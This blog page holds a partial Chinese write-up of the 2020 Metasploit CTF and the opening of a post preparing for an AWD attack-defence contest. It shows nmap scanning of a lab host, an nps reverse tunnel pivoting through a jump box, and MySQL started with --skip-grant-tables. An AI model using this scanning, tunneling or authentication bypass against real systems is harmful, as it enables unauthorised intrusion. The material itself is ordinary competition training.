    <link itemprop="mainEntityOfPage" href="https://hack-for.fun/d22f.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="m0nk3y">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0nk3y‘s Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/d22f.html" class="post-title-link" itemprop="url">2020 December Metasploit community CTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-07 18:52:30" itemprop="dateCreated datePublished" datetime="2020-12-07T18:52:30+08:00">2020-12-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-12-11 11:23:03" itemprop="dateModified" datetime="2020-12-11T11:23:03+08:00">2020-12-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>两台靶机：</p>
<table>
<thead>
<tr>
<th>2020-12-07 10:51:45.687490</th>
<th>Ubuntu Target</th>
<th><code>185.245.3.246</code></th>
<th><a target="_blank" rel="noopener" href="https://metasploitctf.com/users/1875">m0nk3y</a></th>
</tr>
</thead>
<tbody><tr>
<td>2020-12-07 10:51:45.679223</td>
<td>Kali Jump Host</td>
<td><code>185.245.3.246</code></td>
<td><a target="_blank" rel="noopener" href="https://metasploitctf.com/users/1875">m0nk3y</a></td>
</tr>
</tbody></table>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207185354.png" alt="image-20201207185351417"></p>
<p>Kali 作为跳板机去打 内网Ubuntu。</p>
<p>Kali : <code>3.85.234.26</code></p>
<p>Ubuntu: <code>172.15.53.85</code></p>
<p>题目如下：</p>
<p>![image-20201207190045534](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207190045534.png)</p>
<p>ssh 登录 kali</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i metasploit_ctf_kali_ssh_key.pem kali@3.85.234.26</span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207190722932.png)</p>
<h1 id="直接开淦"><a href="#直接开淦" class="headerlink" title="直接开淦"></a>直接开淦</h1><blockquote>
<p>When you find a challenge flag, calculate and submit the MD5 checksum of the PNG image to receive points! Hashes are <em>not</em> case sensitive.</p>
</blockquote>
<p>说人话，flag就是找到的图片的 md5值，忽略大小写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ ifconfig</span><br><span class="line">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 9001</span><br><span class="line">        inet 172.15.53.84  netmask 255.255.255.240  broadcast 172.15.53.95</span><br><span class="line">        inet6 fe80::866:3aff:fe77:1953  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 0a:66:3a:77:19:53  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 686  bytes 70099 (68.4 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 767  bytes 81674 (79.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 413  bytes 123225 (120.3 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 413  bytes 123225 (120.3 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>

<p>ifconfig, 可以看到内网ip为 172.15.53.84， 而Ubuntu 目标ip为 172.15.53.85 。为同一个内网ip中。</p>
<p>nmap 扫端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -v 172.15.53.85</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-12-07 11:17 UTC</span><br><span class="line">Initiating Ping Scan at 11:17</span><br><span class="line">Scanning 172.15.53.85 [2 ports]</span><br><span class="line">Completed Ping Scan at 11:17, 0.01s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 11:17</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 11:17, 0.00s elapsed</span><br><span class="line">Initiating Connect Scan at 11:17</span><br><span class="line">Scanning 172.15.53.85 [1000 ports]</span><br><span class="line">Discovered open port 8080&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 80&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 8888&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 8200&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 9000&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 9009&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 5555&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 9001&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 9010&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 1080&#x2F;tcp on 172.15.53.85</span><br><span class="line">Completed Connect Scan at 11:17, 0.03s elapsed (1000 total ports)</span><br><span class="line">Nmap scan report for 172.15.53.85</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 990 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80&#x2F;tcp   open  http</span><br><span class="line">1080&#x2F;tcp open  socks</span><br><span class="line">5555&#x2F;tcp open  freeciv</span><br><span class="line">8080&#x2F;tcp open  http-proxy</span><br><span class="line">8200&#x2F;tcp open  trivnet1</span><br><span class="line">8888&#x2F;tcp open  sun-answerbook</span><br><span class="line">9000&#x2F;tcp open  cslistener</span><br><span class="line">9001&#x2F;tcp open  tor-orport</span><br><span class="line">9009&#x2F;tcp open  pichat</span><br><span class="line">9010&#x2F;tcp open  sdr</span><br></pre></td></tr></table></figure>

<p>开启了80端口，先不忙搭nps隧道啥的，我直接curl 请求一下这个 http web服务。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ curl 172.15.53.85</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;title&gt;Metasploit CTF&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;styles.css?v&#x3D;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        margin: 0;</span><br><span class="line">        font-family: sans-serif;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .h2 &#123;</span><br><span class="line">        font-size: 2em;</span><br><span class="line">        color: #222;</span><br><span class="line">        margin-bottom: 0.2em;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">        text-align: center;</span><br><span class="line">        display: flex;</span><br><span class="line">        align-items: center;</span><br><span class="line">        justify-content: center;</span><br><span class="line">        flex-direction: column;</span><br><span class="line">        height: 100vh;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;h2&gt;Welcome!&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;img src&#x3D;&quot;4_of_hearts.png&quot; &#x2F;&gt;</span><br><span class="line">            &lt;p&gt;Your remaining challenges are on other ports&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>curl 下载一下这个图片。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ curl -O 172.15.53.85&#x2F;4_of_hearts.png</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 94015  100 94015    0     0  12.8M      0 --:--:-- --:--:-- --:--:-- 12.8M</span><br><span class="line">kali@kali:~$ ls</span><br><span class="line">4_of_hearts.png  configure_kali.sh</span><br><span class="line">kali@kali:~$ md5sum 4_of_hearts.png</span><br><span class="line">776d1d5ecfb91f71aecad71cb3c7c9d1  4_of_hearts.png</span><br></pre></td></tr></table></figure>

<p>得到这个flag：776d1d5ecfb91f71aecad71cb3c7c9d1。并且给了hint，Your remaining challenges are on other ports。那就再来一个全端口扫描吧。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -p 1-65535 172.15.53.85</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-12-07 11:34 UTC</span><br><span class="line">Nmap scan report for 172.15.53.85</span><br><span class="line">Host is up (0.0037s latency).</span><br><span class="line">Not shown: 65515 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80&#x2F;tcp   open  http</span><br><span class="line">1080&#x2F;tcp open  socks</span><br><span class="line">1337&#x2F;tcp open  waste</span><br><span class="line">4545&#x2F;tcp open  worldscores</span><br><span class="line">5555&#x2F;tcp open  freeciv</span><br><span class="line">6868&#x2F;tcp open  acctopus-cc</span><br><span class="line">8080&#x2F;tcp open  http-proxy</span><br><span class="line">8092&#x2F;tcp open  unknown</span><br><span class="line">8101&#x2F;tcp open  ldoms-migr</span><br><span class="line">8123&#x2F;tcp open  polipo</span><br><span class="line">8200&#x2F;tcp open  trivnet1</span><br><span class="line">8201&#x2F;tcp open  trivnet2</span><br><span class="line">8202&#x2F;tcp open  aesop</span><br><span class="line">8888&#x2F;tcp open  sun-answerbook</span><br><span class="line">9000&#x2F;tcp open  cslistener</span><br><span class="line">9001&#x2F;tcp open  tor-orport</span><br><span class="line">9007&#x2F;tcp open  ogs-client</span><br><span class="line">9008&#x2F;tcp open  ogs-server</span><br><span class="line">9009&#x2F;tcp open  pichat</span><br><span class="line">9010&#x2F;tcp open  sdr	</span><br></pre></td></tr></table></figure>

<blockquote>
<p>有点疑问，有些端口，用浏览器无法正常，curl却能返回一些信息。（原来是有联系的。</p>
</blockquote>
<p>因为搞其他8080端口需要交互了，所以得弄个转发，在本机操作一下。</p>
<p><strong>nps可以不落地配置文件启动：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;npc -server&#x3D;ip:port -vkey&#x3D;web界面中显示的密钥</span><br></pre></td></tr></table></figure>

<p>nps建立成功后创建隧道。http 和 socks 代理就行啦。(这个时候可以把kali这台机器当做是我们已经GetShell 后的一台边界主机，因为kali 能出网，也能访问内网应用)，kali 机器上安装 npc。</p>
<p>浏览器和proxychains4设置成nps 代理，这样就能在浏览器和 工具都在代理了。(或者直接用Proxifier</p>
<p>![image-20201207210033802](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207210033802.png)</p>
<p>![image-20201207210239170](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207210239170.png)</p>
<hr>
<p>OK, 代理问题解决好了后，就继续淦。</p>
<h2 id="80端口-4-of-Hearts"><a href="#80端口-4-of-Hearts" class="headerlink" title="80端口 4 of Hearts"></a>80端口 4 of Hearts</h2><p>80端口访问的那张图片的md5.</p>
<h2 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h2><h2 id="4545端口"><a href="#4545端口" class="headerlink" title="4545端口"></a>4545端口</h2><p>![image-20201208003754322](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208003754322.png)</p>
<p>看到simplehttp  和 python，用curl请求一下果然有类似flag的文件，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 4.01&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;html4&#x2F;strict.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Directory listing for &#x2F;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Directory listing for &#x2F;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li&gt;&lt;a href&#x3D;&quot;8_of_hearts.elf&quot;&gt;8_of_hearts.elf&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href&#x3D;&quot;8_of_hearts.enc&quot;&gt;8_of_hearts.enc&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>



<p>用curl -o 这次好像不能下载了， 用wget下载就可以了。</p>
<pre><code>8_of_hearts.elf
8_of_hearts.enc</code></pre>
<p>得到这两个二进制文件。</p>
<p>xxd 查看一下</p>
<p>![image-20201208004140345](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208004140345.png)</p>
<p>拖入IDA，F5一波（x），查看字符串：</p>
<p>![image-20201208005344308](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208005344308.png)</p>
<p>F5一下 main函数：</p>
<p>![image-20201208005832787](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208005832787.png)</p>
<h2 id="6868端口"><a href="#6868端口" class="headerlink" title="6868端口"></a>6868端口</h2><h2 id="8092端口"><a href="#8092端口" class="headerlink" title="8092端口"></a>8092端口</h2><p>![image-20201208011629368](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208011629368.png)</p>
<h2 id="8101端口"><a href="#8101端口" class="headerlink" title="8101端口"></a>8101端口</h2><p>![image-20201207221508164](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207221508164.png)</p>
<h2 id="8200-文件上传GetShell"><a href="#8200-文件上传GetShell" class="headerlink" title="8200 文件上传GetShell"></a>8200 文件上传GetShell</h2><p>BP 要先设置 socks ，然后才能正常的抓包和重放。</p>
<p>![image-20201207215251038](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207215251038.png)</p>
<p>有两种错误：</p>
<ul>
<li>Unsupported mime type (文件上传的后缀和content-type 不对应)</li>
<li>Unsupported file format(gif以及其他后缀，只能传 jpg 和  png)</li>
</ul>
<p>![image-20201208000008329](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208000008329.png)</p>
<h2 id="8202端口"><a href="#8202端口" class="headerlink" title="8202端口"></a>8202端口</h2><p>![image-20201208012652639](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208012652639.png)</p>
<h2 id="8888端口"><a href="#8888端口" class="headerlink" title="8888端口"></a>8888端口</h2><p>![image-20201208012835327](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208012835327.png)</p>
<h2 id="9000端口"><a href="#9000端口" class="headerlink" title="9000端口"></a>9000端口</h2><p>![image-20201208013004434](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208013004434.png)</p>
<h2 id="9001端口"><a href="#9001端口" class="headerlink" title="9001端口"></a>9001端口</h2><p>![image-20201208013102209](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208013102209.png)</p>
<h2 id="9010端口-Queen-of-Hearts"><a href="#9010端口-Queen-of-Hearts" class="headerlink" title="9010端口 Queen of Hearts"></a>9010端口 Queen of Hearts</h2><p>直接访问，给了一个jar包。</p>
<p>![image-20201207211819717](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207211819717.png)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">──&gt; java -jar QOH_Client.jar                        ──(一,1207)─┘</span><br><span class="line">Usage:</span><br><span class="line">	java -jar QOH_Client.jar &lt;ip&gt; &lt;port&gt;</span><br><span class="line"></span><br><span class="line">	where port is generally 9008</span><br><span class="line">──&gt; proxychains4 java -jar QOH_Client.jar 172.15.53.85 9008</span><br></pre></td></tr></table></figure>



<p>[proxychains] Strict chain  …  xx.xx.xxx.116:6443  …  xx.xx.xxx.116:6080  …  172.15.53.85:9008  …  OK<br>Successfully connected to the server!<br>Please select an available action from the list below:<br>[1] Lists available files on the server<br>[2] Download available files from the server<br>[3] Authenticate to the server</p>
<p>1<br>Executing action…<br>Listing available files to download:</p>
<p>test.txt<br>queen_of_hearts.png<br>todo.md</p>
<p>Please select an available action from the list below:<br>[1] Lists available files on the server<br>[2] Download available files from the server<br>[3] Authenticate to the server</p>
<p>2<br>Executing action…<br>Checking authentication status…<br>You are not authenticated. Please authenticate before attempting to download from the server</p>
<p>要拿Queen of Hearts这个题的flag，要知道密码，em，好像不能暴破，先放一下。</p>
<h2 id="9007端口-Red-Joker"><a href="#9007端口-Red-Joker" class="headerlink" title="9007端口 Red Joker"></a>9007端口 Red Joker</h2><p>![image-20201207212225564](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207212225564.png)</p>
<p>下载里面就有一个图片，直接 md5 filename 获取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─(~&#x2F;CTF&#x2F;metasploit_ctf&#x2F;red_joker)─────────────────────────────────────────────────────────────────────────────────────────────────(m0nk3y@RedTeaming:s000)─┐</span><br><span class="line">└─(21:24:29)──&gt; md5 joker_red.png                                                                                                               ──(一,1207)─┘</span><br><span class="line">MD5 (joker_red.png) &#x3D; ded8965ad103400300b7180b42f55e28</span><br></pre></td></tr></table></figure>

<h2 id="9009"><a href="#9009" class="headerlink" title="9009"></a>9009</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─(01:32:22)──&gt; proxychains4 curl http:&#x2F;&#x2F;172.15.53.85:9009                                                                                      ──(二,1208)─┘</span><br><span class="line">[proxychains] config file found: &#x2F;usr&#x2F;local&#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;proxychains-ng&#x2F;4.14&#x2F;lib&#x2F;libproxychains4.dylib</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">[proxychains] Strict chain  ...  45.76.110.116:6443  ...  45.76.110.116:6080  ...  172.15.53.85:9009  ...  OK</span><br><span class="line">SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3</span><br><span class="line">Protocol mismatch.</span><br></pre></td></tr></table></figure>

<h1 id="国外友人的WP"><a href="#国外友人的WP" class="headerlink" title="国外友人的WP"></a>国外友人的WP</h1><p><a target="_blank" rel="noopener" href="https://rushisec.net/metasploit-ctf-2020-writeup/#9ofheartsport53">https://rushisec.net/metasploit-ctf-2020-writeup/#9ofheartsport53</a></p>
<p><a target="_blank" rel="noopener" href="https://ctftime.org/event/1200/tasks/">https://ctftime.org/event/1200/tasks/</a></p>
<p>挺不错的，就是发现比赛有点晚了，就打了一会儿就给停了vps。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hack-for.fun/4ca3.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="m0nk3y">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0nk3y‘s Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/4ca3.html" class="post-title-link" itemprop="url">备战祥云杯总决赛</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-07 00:55:16" itemprop="dateCreated datePublished" datetime="2020-12-07T00:55:16+08:00">2020-12-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-12-11 11:23:03" itemprop="dateModified" datetime="2020-12-11T11:23:03+08:00">2020-12-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>祥云杯线下，队友让我去打。感谢队友(小组成员)的信任，但是我线上几乎没有输出。因为p1g3师傅太猛了，我都忙着复现去了。所以，去打线下，一方面有点不好意思，二方面有些压力，因为毕竟是大场面。我也是第一次打这种大比赛吧，全是高手。</p>
</blockquote>
<h2 id="日程"><a href="#日程" class="headerlink" title="日程"></a>日程</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207010127.png" alt="image-20201207010126323"></p>
<p>在比赛前，每天都干CTF了。</p>
<p>还有搬砖，以及期末复习。</p>
<h2 id="总决赛计分规则"><a href="#总决赛计分规则" class="headerlink" title="总决赛计分规则"></a>总决赛计分规则</h2><p>总决赛 =  CTF赛 + AWD 对抗赛</p>
<p><strong>第一天8小时AWD + 第二天6小时CTF。</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207010103.png" alt="image-20201207005937030"></p>
<h1 id="Attack-With-Defense"><a href="#Attack-With-Defense" class="headerlink" title="Attack With Defense"></a>Attack With Defense</h1><p>用的杭电的平台：</p>
<blockquote>
<p>请输入管理员账号：<br>d0g3awd<br>请输入管理员密码：<br>d0g3awd</p>
<p><a target="_blank" rel="noopener" href="https://github.com/vidar-team/Cardinal/issues/77">https://github.com/vidar-team/Cardinal/issues/77</a></p>
<p>2020/12/08 09:40:51 添加管理员账号成功，请妥善保管您的账号密码信息！<br>2020/12/08 09:40:51 比赛总轮数：6656<br>2020/12/08 09:40:51 比赛总时长：33280  分钟<br>2020/12/08 09:40:51 Round 5</p>
</blockquote>
<p>启动平台：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service mysqld stop</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;mysqld_safe --skip-grant-tables</span><br><span class="line">然后守护进程启动平台即可</span><br></pre></td></tr></table></figure>



<h2 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6416#toc-1%EF%BC%88%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AFAWD%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%EF%BC%89">https://xz.aliyun.com/t/6416#toc-1（广东强网杯AWD题目分析）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rcsec/p/9328011.html%EF%BC%88%E7%BA%BF%E4%B8%8BAWD%E5%A5%97%E8%B7%AF%E5%B0%8F%E7%BB%93%EF%BC%89">https://www.cnblogs.com/Rcsec/p/9328011.html（线下AWD套路小结）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/HacTF/p/9606589.html%EF%BC%88%E6%90%85%E5%B1%8E%E6%A8%A1%E5%BC%8F%EF%BC%89">https://www.cnblogs.com/HacTF/p/9606589.html（搅屎模式）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/201222.html%EF%BC%88AWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%B5%81%E7%A8%8B%E5%8F%8A%E5%87%86%E5%A4%87%E7%BB%8F%E9%AA%8C%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E4%B8%8B%E9%9D%A2%E7%9A%84%E8%B5%84%E6%BA%90%E9%93%BE%E6%8E%A5%E6%9B%B4%E5%A4%9A%EF%BC%89">https://www.freebuf.com/articles/network/201222.html（AWD攻防赛流程及准备经验，这个网站下面的资源链接更多）</a></p>
<h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><ul>
<li>在线查杀</li>
</ul>
